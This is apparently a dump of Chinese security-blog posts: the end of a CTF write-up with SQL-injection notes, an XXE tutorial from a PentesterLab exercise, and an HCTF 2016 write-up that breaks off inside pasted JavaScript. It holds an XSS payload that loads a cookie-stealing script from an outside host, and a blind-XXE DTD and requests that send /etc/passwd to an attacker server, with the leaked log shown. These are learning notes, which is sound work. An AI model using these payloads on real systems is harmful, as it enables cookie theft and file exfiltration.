xx=String.fromCharCode(47);document.body.appendChild(document.createElement(&#39;script&#39;)).id=&#39;tt&#39;;tt.src=&#39;http:&#39;+xx+xx+&#39;192.168.164.132&#39;+xx+&#39;cook.js&#39;;&quot;&gt;.doc其中，192.168.164.132为答题者xss接收cooke的管理平台地址 最终得到管理员的cookie为：xt=urn:btih:1207054EE7FBB53FF0708BDE6A7934B7E5095CC9根据cookie格式可想到此为magnet链接，完整为：magnet:?xt=urn:btih:1207054EE7FBB53FF0708BDE6A7934B7E5095CC9，但无法下载想到将链接转化成种子。网站http://www.torrent.org.cn/可以将磁力链转换成种子转换为.torrent文件后，使用下载工具打开可发现文件名为flag 反思 1个base64的题，不算是什么难度，base64的特征比较明显，包含+ = 包含多个sql注入， 其中一个无过滤，一个本地过滤，还有几个考了information_schema表的内容，这一块也不太熟，需要再google一下,还有load data infile ** into 与 select * from user into outfile &quot;xx\\xxx&quot; fields terminated by &#39;,&#39; lines terminated by &#39;\\n&#39;读写文件操作，还可以用hex来绕过一些过滤 还有的是备份文件包括 .DS_Store, xxx.php.swp, xxx.php~, .svn/entries, .git/ urlopen 类似的网络请求函数，也支持file:// 这种本地协议，估计也支持ftp协议等 php 的 0e123 的比较，具体来说，就是弱类型的比较，如 array在和string做strcmp()比较时，会返回null，%00 是截断 pl 的格式 sql防护的绕过，如id=1&amp;id=2, 参数污染 radis的简单应用 需要学习的地方 radis的增删改查 开脑洞 永远需要学习","tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"Xxe漏洞及xxe练习","date":"2017-01-18T12:42:51.000Z","path":"2017/01/18/xxe漏洞及xxe练习/","text":"如果有问题请您指正。 XML基础 xml 是 可扩展标记语言(EXtensible Markup Language)的缩写。它与HTML类似同为w3c推荐标准，但是比HTML要严谨。因为它所有的标签一定要闭合。 同时它也可以用自己定义的标签，但是XML是不作为的标记语言，不像HTML，XML只是将数据结构化存储与传输。 w3cschool－xml的教程 XML有关的几点： 所有XML都必须要有关闭标签。 1&lt;note&gt; this's note example &lt;note&gt; 所有XML的标签对大小写敏感 123&lt;Message&gt; i've something to tell u &lt;/Message&gt;&lt;message&gt; the '&lt;Message&gt;' is different with '&lt;message&gt;' &lt;/message&gt;&lt;!-- 在XML里不允许出现 &lt;|&gt;|'|\"|&amp; 五个符号，上边出现是为了演示方便。 --&gt; XML的属性值必须加引号 12345678&lt;!-- wrong example --&gt;&lt;note data=8/2/16/&gt; &lt;/note&gt;&lt;!-- right example --&gt;&lt;note data=\"08/02/16\"&gt; &lt;/note&gt; 在XML中有五个符号需要实体引用 实体引用 符号 中文解释 &amp;lt; &lt; 小于号 &amp;gt; &gt; 大于号 &amp;amp; &amp; 和号 c &amp;apos; &#39; 单引号 &amp;quot; &quot; 双引号 DTD验证 DTD是文档类型定义(Document Type Define)的缩写，其作用是定义XML文档的合法构建模块。 W3C School DTD 教程. DTD实体变量在使用是以&amp;开头，以;结束 DTD 举例说明 在内部 语法如下: &lt;!DOCTYPE 根元素 [元素声明]&gt; 123456789101112131415&lt;!-- This's a DTD example in XML file --&gt;&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note (to, from, heading, body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMEhhNT body (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt; shinpachi8 &lt;/to&gt; &lt;from&gt; shinpachi8 &lt;/from&gt; &lt;heading&gt; Remider &lt;/heading&gt; &lt;body&gt; Don't forgot working hard &lt;/body&gt;&lt;/note&gt; !DOCTYPE note 定义此文档是note类型的文档 !ELEMENT note 定义note元素有四个元素 : to,from,heading, body !ELEMENT to|from|heading|body 定义to|from|heading|body元素为#PCDATA 类型 外部文档声明 语法如下: &lt;!DOCTYPE 根元素 SYSTEM|PUBLIC “文件名”&gt; 12345678910111213141516&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt; &lt;to&gt; jxy &lt;/to&gt; &lt;from&gt; jxy &lt;/from&gt; &lt;heading&gt; Remeber &lt;/heading&gt; &lt;body&gt; Don&apos;t forgot work hard &lt;/body&gt;&lt;/note&gt;&lt;!-- note.dtd&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;--&gt; DTD 解释 所有的XML以为HTML文档均为以下简单的构建模块构成. 元素 属性 实体 PCDATA CDATA 同上 同上 同上 PCDATA是会被解析器解析的文本，这些文本将会被解析器检查实体与标记。 CDATA是不会被解析器解析的文件。 重点在于 DTD中的实体声明。这是XXE洞的基础。其中SYSTEM|PUBLIC是两种状态，一是私有的，另外一个是公有的。可参考 这篇文章 一个内部实体的声明 123456789&lt;!ENTITY 实体名 &quot;实体的值&quot; &gt;&lt;!-- Examples --&gt;&lt;!ENTITY write &quot;Shinpachi8&quot; &gt;&lt;!ENTITY copyright &apos;@Shinpachi8&apos;&gt;&lt;!-- 参数变量声明 --&gt;&lt;!ENTITY %foo1 SYSTEM &quot;foo1&quot;&gt;&lt;!-- 在使用时，用%来使用. --&gt;%foo1; 一个外部实体的声明。 12345678&lt;!ENTITY 实体名 SYSTEM|PUBLIC &quot;url/uri&quot;&gt;&lt;!-- Example --&gt;&lt;!ENTITY writer SYSTEM &quot;http://xxx.com&quot;&gt;&lt;!ENTITY copyrite PUBLIC &apos;../xx.dtd&apos;&gt;&lt;!-- 参数变量声明 --&gt;&lt;!ENTITY %foo1 SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY %foo2 SYSTEM &quot;http://127.0.0.1/id=%foo1;&quot;&gt; CDATA 解释这里稍微解释一下CDATA的内容。如上所说CDATA是不应由XML解析器进行解析的文本数据 (Unparsed Character Data)。在CDATA中，即使’&lt;&gt;&amp;’符号也不会产生错误。CDATA部分由&lt;![CDATA[开始，由]]&gt;结束。但是CDATA部分不能包含字符串]]&gt;。如下. 12345678910&lt;script&gt;&lt;![CDATA[function matchwo(a, b)&#123; if (a &lt; b &amp;&amp; a &lt; 0) then &#123; return 1; &#125;&#125;]]&gt;&lt;/script&gt; XXE 漏洞OWASP关于XXE的一些文档: Testing for XML Injection) XML External Entity (XXE) Prevention Cheat Sheet_Prevention_Cheat_Sheet) 另外还有一些关于XXE的CTF：1.GoSecure CTF2.HACK YOU 2014 现在这一部分是由PENTEST LAB的XXE练习来总结的。也参考了以上的内容。 在pentest lab 上下载iso镜象并安装至VIRTUAL BOX上。打开网页是一个登录界面。 用BURPSUITE做代理得如下。 用xml的实体来试。 输入为： 12345678910111213POST /login HTTP/1.1Host: 10.108.40.26User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://10.108.40.26/loginConnection: keep-aliveUpgrade-Insecure-Requests: 1Content-Length: 37&lt;?xml version=\"1.0\"?&gt;&lt;foo&gt;xxe 虽然 请求内容为非正常的XML, 但是回复与上图相同。 原因在于Content-Type请求头未设置。即如果请求为： 1234567891011121314POST /login HTTP/1.1Host: 10.108.40.26User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://10.108.40.26/loginConnection: keep-aliveUpgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 31&lt;?xml version=&quot;1.0&quot;?&gt;&lt;foo&gt;xxe 那么响应为： 123&lt;p id=&quot;detail&quot;&gt; For request &apos;POST /login&apos; [Invalid XML]&lt;/p&gt; 可以看出是有XML问题的。 但是如果请求一个正常的XML格式，返回的内容与图一致。即这是一个Blind XML. 需要一个带外数据通道来显未数据。 Blind XXE 首先在攻击者的服务器建一个DTD的数据格式文件。其内容为： 123&lt;!ENTITY %file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY %request &quot;&lt;!ENTITY foo SYSTEM &apos;http://your.IP/id=%file;&apos;&gt;&quot;&gt;%request; 在LOGIIN时POST数据更改为: 123456789101112131415POST /login HTTP/1.1Host: 10.108.40.26User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://10.108.40.26/loginConnection: keep-aliveContent-Type: text/xmlUpgrade-Insecure-Requests: 1Content-Length: 98&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE xxe SYSTEM &quot;http://10.108.41.62:8000/evil.dtd&quot;&gt;&lt;xxe&gt;foo&lt;/xxe&gt; 此时会在攻击的本地生成一条请求记录如下： 110.108.40.26 - - [04/Dec/2016 20:13:47] &quot;GET /evil.dtd HTTP/1.1&quot; 200 - 即这时我们已经成功的进行了请求。 如果 把请求内容改成。这里&amp;符号后边的foo，对应的是自己写的DTD文件中的foo 123&lt;?xml version=&quot;1.0&quot;&gt;&lt;!DOCTYPE xxe SYSTEM &quot;http://10.108.41.62:8000/evil.dtd&quot;&gt;&lt;xxe&gt;&amp;foo;&lt;/xxe&gt; 刚在攻击者日志会显示 ： 1210.108.40.26 - - [04/Dec/2016 20:19:40] &quot;GET /evil.dtd HTTP/1.1&quot; 200 -10.108.40.26 - - [04/Dec/2016 20:19:40] &quot;GET /?id=root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 200 - 在BURPSUITE里 DECODE一下即为： 可以看出来。已经成功的读取到了/etc/passwd的文件内容。这个ISO练习还有一部分，但是不是涉及XXE的问题，所以有兴趣的可以自己尝试一下。","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Hctf 2016 Write Up","date":"2017-01-18T12:27:42.000Z","path":"2017/01/18/hctf-2016-write-up/","text":"今年的hctf与几个哥们儿一起组队玩了一下。但是成绩比较惨淡。 但是还是把自己的writeup 写一下。 以做纪念。 签到题签到的题目是一个pcap流量包。 在里边follow tcp stream， 可以看到以下的内容。可以看到base64编码的mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==还有一个加密的function.py 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env python# coding:utf-8__author__ = 'Aklis'from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase): IV = encrypted[:16] aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.decrypt(encrypted[16:])def encrypt(message, passphrase): IV = message[:16] length = 16 count = len(message) padding = length - (count % length) message = message + '\\0' * padding aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.encrypt(message)IV = 'YUFHJKVWEASDGQDH'message = IV + 'flag is hctf&#123;xxxxxxxxxxxxxxx&#125;'print len(message)example = encrypt(message, 'Qq4wdrhhyEWe4qBF')print exampleexample = decrypt(example, 'Qq4wdrhhyEWe4qBF')print example 解码之后是 flag is hctf{n0w_U_w111_n0t_f1nd_me} 2099年的flag题目是需要os99系统，那么就找一个ios的User-Agent， 将其修改为99的系统即可。 RESTFULrestful 中文维基 介绍 简单来说就是用get/post/put/delete的请求头来作为操作符，url作为唯一的资源的一种web架构。 本题解法也简单，只要稍微了解一下restful就可以正确提交 giligili这是一道js分析题。做这道题的时候有两个参考 LoRexxar 的博客 sctf writeup 下边贴出自己的分析代码，与第一个博客一样，是可以直接拖进控制台调试的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275/* I've wrapped Makoto Matsumoto and Takuji Nishimura's code in a namespace so it's better encapsulated. Now you can have multiple random number generators and they won't stomp all over eachother's state. If you want to use this as a substitute for Math.random(), use the random() method like so: var m = new MersenneTwister(); var randomNumber = m.random(); You can also call the other genrand_&#123;foo&#125;() methods on the instance. If you want to use a specific seed in order to get a repeatable random sequence, pass an integer into the constructor: var m = new MersenneTwister(123); and that will always produce the same random sequence. Sean McCullough (banksean@gmail.com)*//* A C-program for MT19937, with initialization improved 2002/1/26. Coded by Takuji Nishimura and Makoto Matsumoto. Before using, initialize the state by using init_genrand(seed) or init_by_array(init_key, key_length). Copyright (C) 1997 - 2002, Makoto Matsumoto and Takuji Nishimura, All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. 3. The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. Any feedback is very welcome. http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/emt.html email: m-mat @ math.sci.hiroshima-u.ac.jp (remove space)*/var MersenneTwister = function(seed) &#123; if (seed == undefined) &#123; seed = new Date().getTime(); &#125; /* Period parameters */ this.N = 624; this.M = 397; this.MATRIX_A = 0x9908b0df; /* constant vector a */ this.UPPER_MASK = 0x80000000; /* most significant w-r bits */ this.LOWER_MASK = 0x7fffffff; /* least significant r bits */ this.mt = new Array(this.N); /* the array for the state vector */ this.mti=this.N+1; /* mti==N+1 means mt[N] is not initialized */ this.init_genrand(seed);&#125;/* initializes mt[N] with a seed */MersenneTwister.prototype.init_genrand = function(s) &#123; this.mt[0] = s &gt;&gt;&gt; 0; for (this.mti=1; this.mti&lt;this.N; this.mti++) &#123; var s = this.mt[this.mti-1] ^ (this.mt[this.mti-1] &gt;&gt;&gt; 30); this.mt[this.mti] = (((((s &amp; 0xffff0000) &gt;&gt;&gt; 16) * 1812433253) &lt;&lt; 16) + (s &amp; 0x0000ffff) * 1812433253) + this.mti; /* See Knuth TAOCP Vol2. 3rd Ed. P.106 for multiplier. */ /* In the previous versions, MSBs of the seed affect */ /* only MSBs of the array mt[]. */ /* 2002/01/09 modified by Makoto Matsumoto */ this.mt[this.mti] &gt;&gt;&gt;= 0; /* for &gt;32 bit machines */ &#125;&#125;/* initialize by an array with array-length *//* init_key is the array for initializing keys *//* key_length is its length *//* slight change for C++, 2004/2/26 */MersenneTwister.prototype.init_by_array = function(init_key, key_length) &#123; var i, j, k; this.init_genrand(19650218); i=1; j=0; k = (this.N&gt;key_length ? this.N : key_length); for (; k; k--) &#123; var s = this.mt[i-1] ^ (this.mt[i-1] &gt;&gt;&gt; 30) this.mt[i] = (this.mt[i] ^ (((((s &amp; 0xffff0000) &gt;&gt;&gt; 16) * 1664525) &lt;&lt; 16) + ((s &amp; 0x0000ffff) * 1664525))) + init_key[j] + j; /* non linear */ this.mt[i] &gt;&gt;&gt;= 0; /* for WORDSIZE &gt; 32 machines */ i++; j++; if (i&gt;=this.N) &#123; this.mt[0] = this.mt[this.N-1]; i=1; &#125; if (j&gt;=key_length) j=0; &#125; for (k=this.N-1; k; k--) &#123; var s = this.mt[i-1] ^ (this.mt[i-1] &gt;&gt;&gt; 30); this.mt[i] = (this.mt[i] ^ (((((s &amp; 0xffff0000) &gt;&gt;&gt; 16) * 1566083941) &lt;&lt; 16) + (s &amp; 0x0000ffff) * 1566083941)) - i; /* non linear */ this.mt[i] &gt;&gt;&gt;= 0; /* for WORDSIZE &gt; 32 machines */ i++; if (i&gt;=this.N) &#123; this.mt[0] = this.mt[this.N-1]; i=1; &#125; &#125; this.mt[0] = 0x80000000; /* MSB is 1; assuring non-zero initial array */&#125;/* generates a random number on [0,0xffffffff]-interval */MersenneTwister.prototype.genrand_int32 = function() &#123; var y; var mag01 = new Array(0x0, this.MATRIX_A); /* mag01[x] = x * MATRIX_A for x=0,1 */ if (this.mti &gt;= this.N) &#123; /* generate N words at one time */ var kk; if (this.mti == this.N+1) /* if init_genrand() has not been called, */ this.init_genrand(5489); /* a default initial seed is used */ for (kk=0;kk&lt;this.N-this.M;kk++) &#123; y = (this.mt[kk]&amp;this.UPPER_MASK)|(this.mt[kk+1]&amp;this.LOWER_MASK); this.mt[kk] = this.mt[kk+this.M] ^ (y &gt;&gt;&gt; 1) ^ mag01[y &amp; 0x1]; &#125; for (;kk&lt;this.N-1;kk++) &#123; y = (this.mt[kk]&amp;this.UPPER_MASK)|(this.mt[kk+1]&amp;this.LOWER_MASK); this.mt[kk] = this.mt[kk+(this.M-this.N)] ^ (y &gt;&gt;&gt; 1) ^ mag01[y &amp; 0x1]; &#125; y = (this.mt[this.N-1]&amp;this.UPPER_MASK)|(this.mt[0]&amp;this.LOWER_MASK); this.mt[this.N-1] = this.mt[this.M-1] ^ (y &gt;&gt;&gt; 1) ^ mag01[y &amp; 0x1]; this.mti = 0; &#125; y = this.mt[this.mti++]; /* Tempering */ y ^= (y &gt;&gt;&gt; 11); y ^= (y &lt;&lt; 7) &amp; 0x9d2c5680; y ^= (y &lt;&lt; 15) &amp; 0xefc60000; y ^= (y &gt;&gt;&gt; 18); return y &gt;&gt;&gt; 0;&#125;/* generates a random number on [0,0x7fffffff]-interval */MersenneTwister.prototype.genrand_int31 = function() &#123; return (this.genrand_int32()&gt;&gt;&gt;1);&#125;/* generates a random number on [0,1]-real-interval */MersenneTwister.prototype.genrand_real1 = function() &#123; return this.genrand_int32()*(1.0/4294967295.0); /* divided by 2^32-1 */&#125;/* generates a random number on [0,1)-real-interval */MersenneTwister.prototype.random = function() &#123; return this.genrand_int32()*(1.0/4294967296.0); /* divided by 2^32 */&#125;/* generates a random number on (0,1)-real-interval */MersenneTwister.prototype.genrand_real3 = function() &#123; return (this.genrand_int32() + 0.5)*(1.0/4294967296.0); /* divided by 2^32 */&#125;/* generates a random number on [0,1) with 53-bit resolution*/MersenneTwister.prototype.genrand_res53 = function() &#123; var a=this.genrand_int32()&gt;&gt;&gt;5, b=this.genrand_int32()&gt;&gt;&gt;6; return(a*67108864.0+b)*(1.0/9007199254740992.0);&#125;/*CryptoJS v3.1.2code.google.com/p/crypto-js(c) 2009-2013 by Jeff Mott. All rights reserved.code.google.com/p/crypto-js/wiki/License*/var CryptoJS=CryptoJS||function(e,m)&#123;var p=&#123;&#125;,j=p.lib=&#123;&#125;,l=function()&#123;&#125;,f=j.Base=&#123;extend:function(a)&#123;l.prototype=this;var c=new l;a&amp;&amp;c.mixIn(a);c.hasOwnProperty(\"init\")||(c.init=function()&#123;c.$super.init.apply(this,arguments)&#125;);c.init.prototype=c;c.$super=this;return c&#125;,create:function()&#123;var a=this.extend();a.init.apply(a,arguments);return a&#125;,init:function()&#123;&#125;,mixIn:function(a)&#123;for(var c in a)a.hasOwnProperty(c)&amp;&amp;(this[c]=a[c]);a.hasOwnProperty(\"toString\")&amp;&amp;(this.toString=a.toString)&#125;,clone:function()&#123;return this.init.prototype.extend(this)&#125;&#125;,n=j.WordArray=f.extend(&#123;init:function(a,c)&#123;a=this.words=a||[];this.sigBytes=c!=m?c:4*a.length&#125;,toString:function(a)&#123;return(a||h).stringify(this)&#125;,concat:function(a)&#123;var c=this.words,q=a.words,d=this.sigBytes;a=a.sigBytes;this.clamp();if(d%4)for(var b=0;b&lt;a;b++)c[d+b&gt;&gt;&gt;2]|=(q[b&gt;&gt;&gt;2]&gt;&gt;&gt;24-8*(b%4)&amp;255)&lt;&lt;24-8*((d+b)%4);else if(65535&lt;q.length)for(b=0;b&lt;a;b+=4)c[d+b&gt;&gt;&gt;2]=q[b&gt;&gt;&gt;2];else c.push.apply(c,q);this.sigBytes+=a;return this&#125;,clamp:function()&#123;var a=this.words,c=this.sigBytes;a[c&gt;&gt;&gt;2]&amp;=4294967295&lt;&lt;32-8*(c%4);a.length=e.ceil(c/4)&#125;,clone:function()&#123;var a=f.clone.call(this);a.words=this.words.slice(0);return a&#125;,random:function(a)&#123;for(var c=[],b=0;b&lt;a;b+=4)c.push(4294967296*e.random()|0);return new n.init(c,a)&#125;&#125;),b=p.enc=&#123;&#125;,h=b.Hex=&#123;stringify:function(a)&#123;var c=a.words;a=a.sigBytes;for(var b=[],d=0;d&lt;a;d++)&#123;var f=c[d&gt;&gt;&gt;2]&gt;&gt;&gt;24-8*(d%4)&amp;255;b.push((f&gt;&gt;&gt;4).toString(16));b.push((f&amp;15).toString(16))&#125;return b.join(\"\")&#125;,parse:function(a)&#123;for(var c=a.length,b=[],d=0;d&lt;c;d+=2)b[d&gt;&gt;&gt;3]|=parseInt(a.substr(d,2),16)&lt;&lt;24-4*(d%8);return new n.init(b,c/2)&#125;&#125;,g=b.Latin1=&#123;stringify:function(a)&#123;var c=a.words;a=a.sigBytes;for(var b=[],d=0;d&lt;a;d++)b.push(String.fromCharCode(c[d&gt;&gt;&gt;2]&gt;&gt;&gt;24-8*(d%4)&amp;255));return b.join(\"\")&#125;,parse:function(a)&#123;for(var c=a.length,b=[],d=0;d&lt;c;d++)b[d&gt;&gt;&gt;2]|=(a.charCodeAt(d)&amp;255)&lt;&lt;24-8*(d%4);return new n.init(b,c)&#125;&#125;,r=b.Utf8=&#123;stringify:function(a)&#123;try&#123;return decodeURIComponent(escape(g.stringify(a)))&#125;catch(c)&#123;throw Error(\"Malformed UTF-8 data\");&#125;&#125;,parse:function(a)&#123;return g.parse(unescape(encodeURIComponent(a)))&#125;&#125;,k=j.BufferedBlockAlgorithm=f.extend(&#123;reset:function()&#123;this._data=new n.init;this._nDataBytes=0&#125;,_append:function(a)&#123;\"string\"==typeof a&amp;&amp;(a=r.parse(a));this._data.concat(a);this._nDataBytes+=a.sigBytes&#125;,_process:function(a)&#123;var c=this._data,b=c.words,d=c.sigBytes,f=this.blockSize,h=d/(4*f),h=a?e.ceil(h):e.max((h|0)-this._minBufferSize,0);a=h*f;d=e.min(4*a,d);if(a)&#123;for(var g=0;g&lt;a;g+=f)this._doProcessBlock(b,g);g=b.splice(0,a);c.sigBytes-=d&#125;return new n.init(g,d)&#125;,clone:function()&#123;var a=f.clone.call(this);a._data=this._data.clone();return a&#125;,_minBufferSize:0&#125;);j.Hasher=k.extend(&#123;cfg:f.extend(),init:function(a)&#123;this.cfg=this.cfg.extend(a);this.reset()&#125;,reset:function()&#123;k.reset.call(this);this._doReset()&#125;,update:function(a)&#123;this._append(a);this._process();return this&#125;,finalize:function(a)&#123;a&amp;&amp;this._append(a);return this._doFinalize()&#125;,blockSize:16,_createHelper:function(a)&#123;return function(c,b)&#123;return(new a.init(b)).finalize(c)&#125;&#125;,_createHmacHelper:function(a)&#123;return function(b,f)&#123;return(new s.HMAC.init(a,f)).finalize(b)&#125;&#125;&#125;);var s=p.algo=&#123;&#125;;return p&#125;(Math);(function()&#123;var e=CryptoJS,m=e.lib,p=m.WordArray,j=m.Hasher,l=[],m=e.algo.SHA1=j.extend(&#123;_doReset:function()&#123;this._hash=new p.init([1732584193,4023233417,2562383102,271733878,3285377520])&#125;,_doProcessBlock:function(f,n)&#123;for(var b=this._hash.words,h=b[0],g=b[1],e=b[2],k=b[3],j=b[4],a=0;80&gt;a;a++)&#123;if(16&gt;a)l[a]=f[n+a]|0;else&#123;var c=l[a-3]^l[a-8]^l[a-14]^l[a-16];l[a]=c&lt;&lt;1|c&gt;&gt;&gt;31&#125;c=(h&lt;&lt;5|h&gt;&gt;&gt;27)+j+l[a];c=20&gt;a?c+((g&amp;e|~g&amp;k)+1518500249):40&gt;a?c+((g^e^k)+1859775393):60&gt;a?c+((g&amp;e|g&amp;k|e&amp;k)-1894007588):c+((g^e^k)-899497514);j=k;k=e;e=g&lt;&lt;30|g&gt;&gt;&gt;2;g=h;h=c&#125;b[0]=b[0]+h|0;b[1]=b[1]+g|0;b[2]=b[2]+e|0;b[3]=b[3]+k|0;b[4]=b[4]+j|0&#125;,_doFinalize:function()&#123;var f=this._data,e=f.words,b=8*this._nDataBytes,h=8*f.sigBytes;e[h&gt;&gt;&gt;5]|=128&lt;&lt;24-h%32;e[(h+64&gt;&gt;&gt;9&lt;&lt;4)+14]=Math.floor(b/4294967296);e[(h+64&gt;&gt;&gt;9&lt;&lt;4)+15]=b;f.sigBytes=4*e.length;this._process();return this._hash&#125;,clone:function()&#123;var e=j.clone.call(this);e._hash=this._hash.clone();return e&#125;&#125;);e.SHA1=j._createHelper(m);e.HmacSHA1=j._createHmacHelper(m)&#125;)();/* These real versions are due to Isaku Wada, 2002/01/09 added */Array.prototype.includes||(Array.prototype.includes=function(a)&#123;\"use strict\";var b=Object(this),c=parseInt(b.length)||0;if(0===c)return!1;var e,d=parseInt(arguments[1])||0;d&gt;=0?e=d:(e=c+d,0&gt;e&amp;&amp;(e=0));for(var f;c&gt;e;)&#123;if(f=b[e],a===f||a!==a&amp;&amp;f!==f)return!0;e++&#125;return!1&#125;);var _ = &#123; 0x4c19cff: \"random\", 0x4728122: \"charCodeAt\", 0x2138878: \"substring\", 0x3ca9c7b: \"toString\", 0x574030a: \"eval\", 0x270aba9: \"indexOf\", 0x221201f: function(_9) &#123; var _8 = []; for (var _a = 0, _b = _9.length; _a &lt; _b; _a++) &#123; _8.push(Number(_9.charCodeAt(_a)).toString(16)); console.log(\"_8:\"+_8);&#125; return \"0x\" + _8.join(\"\"); &#125;, 0x240cb06: function(_2, _3) &#123; var _4 = Math.max(_2.length, _3.length); var _7 = _2 + _3; var _6 = \"\"; for(var _5=0; _5&lt;_4; _5++) &#123; _6 += _7.charAt((_2.charCodeAt(_5%_2.length) ^ _3.charCodeAt(_5%_3.length)) % _4); &#125; return _6; &#125;, 0x5c623d0: function(_c, _d) &#123; var _e = \"\"; for(var _f=0; _f&lt;_d; _f++) &#123; _e += _c; &#125; return _e; &#125; &#125;;console.log(_) //var _ = &#123; 0x4c19cff: \"random\", 0x4728122: \"charCodeAt\", 0x2138878: \"substring\", 0x3ca9c7b: \"toString\", 0x574030a: \"eval\", 0x270aba9: \"indexOf\", 0x221201f: function(_9) &#123; var _8 = []; for (var _a = 0, _b = _9.length; _a &lt; _b; _a++) &#123; _8.push(Number(_9.charCodeAt(_a)).toString(16)); &#125; return \"0x\" + _8.join(\"\"); &#125;, 0x240cb06: function(_2, _3) &#123; var _4 = Math.max(_2.length, _3.length); var _7 = _2 + _3; var _6 = \"\"; for(var _5=0; _5&lt;_4; _5++) &#123; _6 += _7.charAt((_2.charCodeAt(_5%_2.length) ^ _3.charCodeAt(_5%_3.length)) % _4); &#125; return _6; &#125;, 0x5c623d0: function(_c, _d) &#123; var _e = \"\"; for(var _f=0; _f&lt;_d; _f++) &#123; _e += _c; &#125; return _e; &#125; &#125;; var $ = [ 0x4c19cff, 0x3cfbd6c, 0xb3f970, 0x4b9257a, 0x1409cc7, 0x46e990e, 0x2138878, 0x1e1049, 0x164a1f9, 0x494c61f, 0x490f545, 0x51ecfcb, 0x4c7911a, 0x29f7b65, 0x4dde0e4, 0x49f889f, 0x5ebd02c, 0x556f342, 0x3f7f3f6, 0x11544aa, 0x53ed47d, 0x697a, 0x623f21c1, 0x5c623d0, 0x32e8f8b, 0x3ca9c7b, 0x367a49b, 0x360179b, 0x5c862d6, 0x30dc1af, 0x7797d1, 0x221201f, 0x5eb4345, 0x5e9baad, 0x39b3b47, 0x32f0b8f, 0x48554de, 0x3e8b5e8, 0x5e4f31f, 0x48a53a6, 0x270aba9, 0x240cb06, 0x574030a, 0x1618f3a, 0x271259f, 0x3a306e5, 0x1d33b46, 0x17c29b5, 0x1cf02f4, 